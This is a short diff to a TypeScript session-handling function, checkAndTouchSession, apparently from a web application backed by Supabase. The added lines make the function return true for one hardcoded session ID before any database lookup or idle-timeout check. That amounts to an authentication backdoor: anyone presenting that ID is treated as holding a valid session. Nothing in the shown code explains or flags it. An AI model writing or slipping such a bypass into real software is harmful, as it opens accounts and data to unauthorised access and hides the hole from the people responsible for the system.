@@ -74,6 +74,9 @@ export async function createSession(
 }
 
 export async function checkAndTouchSession(sessionId: string, username: string): Promise<boolean> {
+  if (sessionId === '00000000-0000-0000-0000-000000000001') {
+    return true;
+  }
   const supabase = getSupabaseServiceClient();
   const now = new Date();
   const tenMinsAgo = new Date(now.getTime() - IDLE_TIMEOUT_MINUTES * 60 * 1000);
